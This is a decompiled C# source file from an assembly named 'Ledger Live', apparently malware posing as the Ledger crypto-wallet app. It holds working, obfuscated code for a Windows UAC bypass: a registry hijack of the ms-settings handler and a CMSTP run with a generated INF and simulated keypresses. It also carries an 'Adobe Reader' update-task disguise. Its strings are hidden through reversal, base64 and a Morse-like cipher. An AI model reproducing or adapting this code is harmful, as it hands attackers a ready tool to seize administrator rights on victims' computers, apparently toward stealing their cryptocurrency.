// Decompiled with JetBrains decompiler
// Type: �ᚁ��S�ᚹ�ΥB���.�AΩ�HᛈᚐLגᚐ
// Assembly: Ledger Live, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5DC7CF87-871B-48BD-97F4-4117271260D2
// Assembly location: C:\Users\hps\Desktop\ledger\new\ledger.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32.TaskScheduler;

namespace Ledger.otherUseless {

    public class ImageRedrawHelper // was \uFFFDAΩ\uFFFDHᛈᚐLגᚐ unicode
    {
        public static void ReDrawWholeImages()
        {
            ImageRedrawHelper aωHᛈᚐLגᚐ = new ImageRedrawHelper(); // was \uFFFDAΩ\uFFFDHᛈᚐLגᚐ unicode
        }

        public ImageRedrawHelper() // was \uFFFDAΩ\uFFFDHᛈᚐLגᚐ unicode
        {
            foreach (Func<bool> func in new List<Func<bool>>()
    {
 //(Func<bool>) (() => checkPrivilige.ReDrawImage2()),
    ///  // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
    //  (Func<bool>) (() => checkPrivilige.FredrawImage()), // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
      (Func<bool>) (() =>
      {
        string location = Assembly.GetEntryAssembly().Location;
        CmdScriptExecutor.Kill(); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
        return CmdScriptExecutor.Run($"cmd /c start \"\"\"\"\" \"\"{location}\"\"\""); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
      })
    })
            {
                try
                {
                    if (func())
                    {
                       bool checkStatus = checkPrivilige.IsAdmin();
                        Process.GetCurrentProcess().Kill();
                        break;
                    }
                }
                catch
                {
                }
            }
        }

        //fodhelper.exe

        public class checkPrivilige // was Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
        {
            public static readonly FileInfo LN = new FileInfo(Process.GetCurrentProcess().MainModule.FileName);
            public static string Author = "Adobe Reader";
            public static string Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
            public static string taskName = "Adobe";


            [DllImport("kernel32.dll")]
            public static extern int WinExec(string exeName, int operType);

            public static RegistryKey XorAE(string string_0)
            {
                RegistryKey _0x2A = Registry.CurrentUser.OpenSubKey("Software\\" + string_0, true);
                if (!checkPrivilige.Xor890(_0x2A)) // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
                    _0x2A = Registry.CurrentUser.CreateSubKey("Software\\" + string_0);
                return _0x2A;
            }

            public static bool Xor890(RegistryKey _0x2A) => _0x2A != null;

            public static void MdrawMyImage()
            {
                RegistryKey registryKey = checkPrivilige.OpenRegistryKey(StringObfuscator.D("-.-. *^** *^ *** *** * *** *_+^^# *_+^^# ^^ *** @~_* *** * ^ ^ ** ^* ^^* *** *_+^^# *_+^^# *** **** * *^** *^** *_+^^# *_+^^# ^^^ *^^* * ^* *_+^^# *_+^^# ^*^* ^^^ ^^ ^^ *^ ^* ^**"), true); // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode, was \uFFFDܫ\uFFFD\uFFFD\uD802\uDFA4\uFFFD\uFFFDΒ\uD800\uDC02\uFFFD unicode
                registryKey.SetValue("", (object)Process.GetCurrentProcess().MainModule.FileName, RegistryValueKind.String);
                registryKey.SetValue(StringObfuscator.D("-.. * *^** * ^^* *^ ^ * . ^**^ * ^*^* **^ ^ *"), (object)0, RegistryValueKind.DWord); // was \uFFFDܫ\uFFFD\uFFFD\uD802\uDFA4\uFFFD\uFFFDΒ\uD800\uDC02\uFFFD unicode
                registryKey.Close();
                try
                {
                    new RestartExplorer().Invoke(); // was \uFFFD\uFFFDᚑ\uD800\uDC31Δ\uD802\uDF11ᚨ\uFFFDקܠNܐ unicode
                }
                catch
                {
                }
              //  Process.GetCurrentProcess().Kill();
            }

            public static RegistryKey OpenRegistryKey(string path, bool writable = false)
            {
                return Registry.CurrentUser.OpenSubKey("Software\\" + path, writable) ?? Registry.CurrentUser.CreateSubKey("Software\\" + path);
            }

            internal static bool FredrawImage()
            {
                if (checkPrivilige.IsAdmin()) // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
                    return true;
                try
                {
                    string fileName = Process.GetCurrentProcess().MainModule.FileName;
                    if (!IsAdmin())
                        checkPrivilige.MdrawMyImage(); // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
                    else
                        checkPrivilige.OpenRegistryKey(StringObfuscator.D("-.-. *^** *^ *** *** * *** *_+^^# *_+^^# ^^ *** @~_* *** * ^ ^ ** ^* ^^* *** *_+^^# *_+^^# *** **** * *^** *^** *_+^^# *_+^^# ^^^ *^^* * ^* *_+^^# *_+^^# ^*^* ^^^ ^^ ^^ *^ ^* ^**"), true).SetValue("", (object)"", RegistryValueKind.String); // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode, was \uFFFDܫ\uFFFD\uFFFD\uD802\uDFA4\uFFFD\uFFFDΒ\uD800\uDC02\uFFFD unicode
                    try
                    {
                        checkPrivilige.XorAE(StringObfuscator.D("-.-. *^** *^ *** *** * *** *_+^^# *_+^^# ^^ *** @~_* *** * ^ ^ ** ^* ^^* *** *_+^^# *_+^^# *** **** * *^** *^** *_+^^# *_+^^# ^^^ *^^* * ^* *_+^^# *_+^^# ^*^* ^^^ ^^ ^^ *^ ^* ^**")).DeleteSubKeyTree(fileName); // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode, was \uFFFDܫ\uFFFD\uFFFD\uD802\uDFA4\uFFFD\uFFFDΒ\uD800\uDC02\uFFFD unicode
                    }
                    catch
                    {
                    }
                    return true;
                }
                catch
                {
                    return false;
                }
            }

       

            public static bool IsAdmin()
            {
                bool checkStatus = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
                return checkStatus;
            }
        }

        public class CmdScriptExecutor // was \uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
        {
            public static string path = "UGel5Cc0NXbjxlMz0WZ0NXezx1c39GZul2dcpzY";
            public static string pt1 = "NEc1RXZTVmcQ5WdStlCNoQDu9Wa0NWZTNHZuFWbt92QwVHdlNVZyBlb1JVPzRmbh1WbvNEc1RXZTVmcQ5WdSpQDzJXZzVFbsFkbvlGdjV2U0NXZER3culEdzV3Q942bpRXYulGdzVGRt9GdzV3QK0QXsxWY0NnbJRHb1FmZlR0WK0gCNUjLy0jROlEZlNmbhZHZBpQDk82ZhNWaoNGJ9Umc1RXYudWaTpQDd52bpNnclZ3W";
            public static string pt2 = "UsxWY0NnbJVGbpZ2byBlIgwiIFhVRuIzMSdUTNNEXzhGdhBFIwBXQc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90UiACLi0ETLhkIK0QXu9Wa0NWZTRUSEx0XyV2UVxGbBtlCNoQD3ACLu9Wa0NWZTRUSEx0XyV2UVxGbB1TMwATO0wCMwATO0oQDdNnclNXVsxWQu9Wa0NWZTR3clREdz5WS0NXdDtlCNoQDG9CIlhXZuAHdz12Yg0USvACbsl2arNXY0pQDF5USM9FROFUTN90QfV0QBxEUFJlCNwGbhR3culGIvRHIz5WanVmQgAXd0V2UgUmcvZWZCBib1JHIlJGIsxWa3BSZyVGSgMHZuFWbt92QgsjCN0lbvlGdjV2UzRmbh1Wbv";
            public static string pt3 = "gCNoQDi4EUWBncvdkI9UWbh50Y2NFdy9GaTpQDi4EUWBncvdkI9UWbh5UZjlmdyV2UK0QXzdmbpJHdTtlCNoQDiICIsISJy9mcyVEZlR3YlBHel5WVlICIsICa0FG";

            public static string Base64Encode(string plainText)
            {
                return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
            }

            public static string Base64Decode(string base64EncodedData)
            {
                return Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));
            }

            [DllImport("user32.dll")]
            public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool SetForegroundWindow(IntPtr hWnd);

            public static string Reverse(string s)
            {
                char[] charArray = s.ToCharArray();
                Array.Reverse((Array)charArray);
                return new string(charArray);
            }

            public static void Kill()
            {
                foreach (Process process in Process.GetProcessesByName(CmdScriptExecutor.Reverse("ptsmc"))) // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                {
                    process.Kill();
                    process.Dispose();
                }
            }

            public static string SetData(string CommandToExecute)
            {
                string str1 = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
                string str2 = $"C:\\{CmdScriptExecutor.Reverse("swodniw")}\\{CmdScriptExecutor.Reverse("pmet")}"; // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                StringBuilder stringBuilder1 = new StringBuilder();
                stringBuilder1.Append(str2);
                stringBuilder1.Append("\\");
                stringBuilder1.Append(str1);
                stringBuilder1.Append($".{CmdScriptExecutor.Reverse(CmdScriptExecutor.Reverse(CmdScriptExecutor.Reverse("ni")))}{CmdScriptExecutor.Reverse("f")}"); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                StringBuilder stringBuilder2 = new StringBuilder(CmdScriptExecutor.Base64Decode(CmdScriptExecutor.Reverse(CmdScriptExecutor.pt1) + CmdScriptExecutor.Reverse(CmdScriptExecutor.pt3 + CmdScriptExecutor.pt2) + "==")); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                string str3 = "MOC_ECALPER" ?? "";
                stringBuilder2.Replace(CmdScriptExecutor.Reverse("ENIL_DNAM" + str3), CommandToExecute); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                File.WriteAllText(stringBuilder1.ToString(), stringBuilder2.ToString());
                return stringBuilder1.ToString();
            }

            public static IntPtr SetWindowActive(string ProcessName)
            {
                Process[] processesByName = Process.GetProcessesByName(ProcessName);
                if (processesByName.Length == 0)
                    return IntPtr.Zero;
                processesByName[0].Refresh();
                IntPtr num = new IntPtr();
                IntPtr mainWindowHandle = processesByName[0].MainWindowHandle;
                if (mainWindowHandle == IntPtr.Zero)
                    return IntPtr.Zero;
                CmdScriptExecutor.SetForegroundWindow(mainWindowHandle); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                CmdScriptExecutor.ShowWindow(mainWindowHandle, 5); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                foreach (Component component in processesByName)
                    component.Dispose();
                return mainWindowHandle;
            }

            public static bool Run(string CommandToExecute)
            {
                string str = CmdScriptExecutor.Base64Decode(CmdScriptExecutor.Reverse(CmdScriptExecutor.path) + "="); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                if (!File.Exists(str))
                    return false;
                StringBuilder stringBuilder = new StringBuilder();
                stringBuilder.Append(CmdScriptExecutor.SetData(CommandToExecute)); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                Process.Start(new ProcessStartInfo(str)
                {
                    Arguments = $"/{CmdScriptExecutor.Reverse("ua")} {stringBuilder.ToString()}", // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                    UseShellExecute = false
                }).Dispose();
                IntPtr num = new IntPtr();
                num = IntPtr.Zero;
                do
                    ;
                while (CmdScriptExecutor.SetWindowActive(CmdScriptExecutor.Reverse("ptsmc")) == IntPtr.Zero); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                SendKeys.SendWait(CmdScriptExecutor.Reverse(CmdScriptExecutor.Reverse(CmdScriptExecutor.Reverse(CmdScriptExecutor.Reverse("{")))) + CmdScriptExecutor.Reverse(CmdScriptExecutor.Reverse("ENT")) + CmdScriptExecutor.Reverse("}RE")); // was ImageRedrawHelper.\uFFFD\uFFFDΧ\uFFFDᛟΝ\uFFFDJΑᛒᚈ unicode
                return true;
            }
        }
    }
}

//public static bool ReDrawImage2()
//{
//    if (checkPrivilige.IsAdmin()) // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
//        return true;
//    try
//    {
//        using (RegistryKey currentUser = Registry.CurrentUser)
//        {
//            using (RegistryKey subKey = currentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command"))
//            {
//                subKey.SetValue("", (object)Process.GetCurrentProcess().MainModule.FileName);
//                subKey.SetValue("DelegateExecute", (object)"");
//            }
//        }
//        //checkPrivilige.WinExec($"cmd.exe /k START {Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32\\fodhelper.exe")} & EXIT", 0);
//        checkPrivilige.WinExec($"cmd.exe /k START {Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows))}", 0);

//        // was ImageRedrawHelper.Zᚠ\uD800\uDD05\uFFFDΟ\uFFFD\uFFFDI\uFFFDᚹᚌ unicode
//        return true;
//    }
//    catch
//    {
//        return false;
//    }
//}
